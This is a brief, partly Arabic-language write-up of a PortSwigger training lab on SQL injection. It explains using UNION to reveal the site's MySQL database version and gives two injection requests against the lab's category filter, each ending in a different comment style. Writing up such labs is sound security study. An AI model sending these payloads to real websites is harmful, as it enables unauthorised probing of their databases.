# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

- الفكره انك تعرض الdatabase الخاصه بالموقع الخاصه بنوع MySQL
- يستخدام UNION

```bash
1. GET /filter?category=Accessories'union select null,version()-- - 

2. GET /filter?category=Accessories'union select null,version()#
```
